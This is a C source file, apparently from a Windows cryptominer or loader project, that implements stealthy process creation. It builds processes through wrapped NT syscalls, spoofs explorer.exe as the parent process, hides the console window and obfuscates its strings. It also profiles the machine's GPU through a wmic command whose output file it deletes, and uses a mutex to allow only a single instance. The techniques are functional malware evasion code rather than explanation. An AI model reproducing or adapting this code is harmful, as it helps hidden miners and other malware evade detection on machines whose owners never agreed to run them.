#include "common.h"

#include "ntddk.h"
#include "utils.h"
#include "obfuscatew.h"

#include <wchar.h>

bool has_gpu(wchar_t* startDir, wchar_t* cmdPath, wchar_t* dstDir) {
    wchar_t gpuPath[MAX_PATH] = { 0 };
    combine_path(gpuPath, dstDir, AYW_OBFUSCATE(L"g.log"));
    create_recursive_directory(dstDir);

    run_program(true, startDir, cmdPath, AYW_OBFUSCATE(L"%S /c wmic PATH Win32_VideoController GET Name, VideoProcessor > \"%S\""), cmdPath, gpuPath);
	
    ULONG gpuFileSize;
    PVOID gpuFile = read_file(gpuPath, &gpuFileSize);
	delete_file(gpuPath);
	
	if(gpuFile && gpuFileSize > 0) {
		const wchar_t* gpuString = (const wchar_t*)gpuFile;
		if (wcsstr(gpuString, AYW_OBFUSCATE(L"NVIDIA")) != NULL || 
			wcsstr(gpuString, AYW_OBFUSCATE(L"NVidia")) != NULL || 
			wcsstr(gpuString, AYW_OBFUSCATE(L"AMD")) != NULL ||
			wcsstr(gpuString, AYW_OBFUSCATE(L"ATi")) != NULL ||
			wcsstr(gpuString, AYW_OBFUSCATE(L"Advanced Micro Devices")) != NULL) 
		{
			return true;
		}
	}
    return false;
}

PROCESS_INFORMATION create_new_process_internal(LPWSTR programPath, LPWSTR cmdLine, LPWSTR startDir, DWORD processFlags, DWORD threadFlags) {
	/* 
		Custom NtCreateUserProcess creation painstakingly made by Unam Sanctam https://github.com/UnamSanctam
	*/
	ULONG sz = 0;
	UtQuerySystemInformation(SystemProcessInformation, NULL, 0, &sz);
	PVOID procBuffer = NULL;
    SIZE_T requiredMemory = (SIZE_T)sz;
	HANDLE procId = NULL;
	if (NT_SUCCESS(UtAllocateVirtualMemory(UtCurrentProcess(), &procBuffer, 0, &requiredMemory, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) && 
		NT_SUCCESS(UtQuerySystemInformation(SystemProcessInformation, procBuffer, sz, &sz))) 
	{
		PSYSTEM_PROCESS_INFORMATION pspi;
        ULONG ofs = 0;
		while (true)
		{
			pspi = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)procBuffer + ofs);
			if (pspi->ImageName.Length > 0 && !wcsncmp(AYW_OBFUSCATE(L"explorer.exe"), pspi->ImageName.Buffer, pspi->ImageName.Length / sizeof(wchar_t))) {
				procId = pspi->UniqueProcessId;
				break;
            }
			
			if (!pspi->NextEntryOffset || ofs + pspi->NextEntryOffset >= sz) {
				break;
			}
			ofs += pspi->NextEntryOffset;
		}
	}

	HANDLE hParent = NULL;
	if (procId) {
		OBJECT_ATTRIBUTES oa;
		InitializeObjectAttributes(&oa, 0, 0, 0, 0);
		CLIENT_ID id = { procId, NULL };

		NTSTATUS openStatus = UtOpenProcess(&hParent, PROCESS_CREATE_PROCESS, &oa, &id);
		if (!NT_SUCCESS(openStatus)) {
			hParent = UtCurrentProcess();
		}
	}
	else {
		hParent = UtCurrentProcess();
	}

    HANDLE hToken = NULL;
	UtOpenProcessToken(UtCurrentProcess(), TOKEN_ASSIGN_PRIMARY, &hToken);

	PSW2_PEB_EXT PebExt = (PSW2_PEB_EXT)__readgsqword(0x60);
	PRTL_USER_PROCESS_PARAMETERS CurProcessParameters = PebExt->ProcessParameters;

    UNICODE_STRING nt_program_path, start_directory, command_line;

    wchar_t ntPath[MAX_PATH+4] = { 0 };
    combine_path(ntPath, AYW_OBFUSCATE(L"\\??\\"), programPath);
    INIT_UNICODE_STRING(nt_program_path, ntPath);
    if (startDir) {
        wchar_t startCont[MAX_PATH] = { 0 };
        wcscpy(startCont, startDir);
        INIT_UNICODE_STRING(start_directory, startCont);
	}
	else {
		start_directory = CurProcessParameters->CurrentDirectory.DosPath;
	}
    if (cmdLine) {
        wchar_t cmdCont[MAX_COMMAND_LENGTH] = { 0 };
        wcscpy(cmdCont, cmdLine);
        INIT_UNICODE_STRING(command_line, cmdCont);
	}
	else {
		command_line = nt_program_path;
	}

	UNICODE_STRING WindowTitle, DesktopInfo, ShellInfo, RuntimeData;

	wchar_t emptyChar[1] = { 0 };
	INIT_UNICODE_STRING(WindowTitle, emptyChar);
	INIT_UNICODE_STRING(DesktopInfo, emptyChar);
	INIT_UNICODE_STRING(ShellInfo, emptyChar);

    ULONG totalsize = 0;
	totalsize += sizeof(RTL_USER_PROCESS_PARAMETERS);
	totalsize += start_directory.MaximumLength;
	totalsize += nt_program_path.Length;
	totalsize += CurProcessParameters->DllPath.Length;
	totalsize += command_line.Length;
	totalsize += WindowTitle.MaximumLength;
	totalsize += DesktopInfo.MaximumLength;
	totalsize += ShellInfo.MaximumLength;

	PVOID ProcessParametersData = NULL;
    SIZE_T ProcessParametersSize = totalsize;
    UtAllocateVirtualMemory(UtCurrentProcess(), &ProcessParametersData, 0, &ProcessParametersSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = (RTL_USER_PROCESS_PARAMETERS*)ProcessParametersData;
	ProcessParameters->MaximumLength = totalsize;
	ProcessParameters->Length = totalsize;
	ProcessParameters->Flags = 1;
	ProcessParameters->DebugFlags = 0;
	ProcessParameters->ConsoleHandle = HANDLE_CREATE_NO_WINDOW;
	ProcessParameters->ConsoleFlags = 0;
	ProcessParameters->StandardInput = NULL;
	ProcessParameters->StandardOutput = NULL;
	ProcessParameters->StandardError = NULL;
	ProcessParameters->CurrentDirectory.DosPath = start_directory;
	ProcessParameters->CurrentDirectory.Handle = NULL;
	ProcessParameters->DllPath = CurProcessParameters->DllPath;
	ProcessParameters->ImagePathName = nt_program_path;
	ProcessParameters->ImagePathName.MaximumLength = nt_program_path.Length + 2;
	ProcessParameters->CommandLine = command_line;
	ProcessParameters->CommandLine.MaximumLength = command_line.Length + 2;
	ProcessParameters->Environment = CurProcessParameters->Environment;
	ProcessParameters->StartingX = 0;
	ProcessParameters->StartingY = 0;
	ProcessParameters->CountX = 0;
	ProcessParameters->CountY = 0;
	ProcessParameters->CountCharsX = 0;
	ProcessParameters->CountCharsY = 0;
	ProcessParameters->FillAttribute = 0;
	ProcessParameters->WindowFlags = 0;
	ProcessParameters->ShowWindowFlags = 0;
	ProcessParameters->WindowTitle = WindowTitle;
	ProcessParameters->DesktopInfo = DesktopInfo;
	ProcessParameters->ShellInfo = ShellInfo;
	ProcessParameters->RuntimeData = RuntimeData;
	ProcessParameters->EnvironmentSize = CurProcessParameters->EnvironmentSize;
	ProcessParameters->EnvironmentVersion = 0;

	PS_CREATE_INFO CreateInfo = { 0 };
	CreateInfo.Size = sizeof(CreateInfo);
	CreateInfo.State = PsCreateInitialState;

	PVOID AttributeListData = NULL;
    SIZE_T AttributeListSize = sizeof(PS_ATTRIBUTE) * 3;
    UtAllocateVirtualMemory(UtCurrentProcess(), &AttributeListData, 0, &AttributeListSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)AttributeListData;
	AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);

	AttributeList->Attributes[0].Attribute = 0x20005;
	AttributeList->Attributes[0].Size = nt_program_path.Length;
	AttributeList->Attributes[0].u1.Value = (ULONG_PTR)nt_program_path.Buffer;

    AttributeList->Attributes[1].Attribute = 0x60000;
    AttributeList->Attributes[1].Size = sizeof(HANDLE);
    AttributeList->Attributes[1].u1.ValuePtr = hParent;

    AttributeList->Attributes[2].Attribute = 0x60002;
	AttributeList->Attributes[2].Size = sizeof(HANDLE);
	AttributeList->Attributes[2].u1.ValuePtr = hToken;

	HANDLE hProcess, hThread = NULL;
	UtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, processFlags, threadFlags, ProcessParameters, &CreateInfo, AttributeList);

	ProcessParametersSize = 0;
	UtFreeVirtualMemory(UtCurrentProcess(), &ProcessParametersData, &ProcessParametersSize, MEM_RELEASE);
	AttributeListSize = 0;
	UtFreeVirtualMemory(UtCurrentProcess(), &AttributeListData, &AttributeListSize, MEM_RELEASE);

    PROCESS_INFORMATION pi = { hProcess, hThread };

    return pi;
}

void run_program(bool wait, wchar_t* startDir, wchar_t* programPath, wchar_t* cmdLine, ...) {
    wchar_t cmdLineFormatted[MAX_COMMAND_LENGTH] = { 0 };
    va_list argptr;
    va_start(argptr, cmdLine);
    vswprintf(cmdLineFormatted, MAX_COMMAND_LENGTH, cmdLine, argptr);
    va_end(argptr);
    PROCESS_INFORMATION pi = create_new_process_internal(programPath, cmdLineFormatted, startDir, 0, 0);
	if(wait) {
        LARGE_INTEGER waittime;
        waittime.QuadPart = -(30000 * 10000);
		UtWaitForSingleObject(pi.hProcess, FALSE, &waittime);
	}
	UtClose(pi.hProcess);
}

bool check_mutex(wchar_t* mutex) {
    bool mutexActive = false;
    if (mutex != NULL) {
        HANDLE hMutex = NULL;

        wchar_t mutexTemp[MAX_PATH] = { 0 };
        wcscpy(mutexTemp, mutex);
        UNICODE_STRING umutex;
        INIT_UNICODE_STRING(umutex, mutexTemp);

        OBJECT_ATTRIBUTES attr;
        InitializeObjectAttributes(&attr, &umutex, 0, NULL, NULL);

        NTSTATUS status = UtCreateMutant(&hMutex, MUTANT_ALL_ACCESS, &attr, FALSE);

        mutexActive = !NT_SUCCESS(status) || hMutex == INVALID_HANDLE_VALUE || hMutex == NULL;
        UtClose(hMutex);
    }
    return mutexActive;
}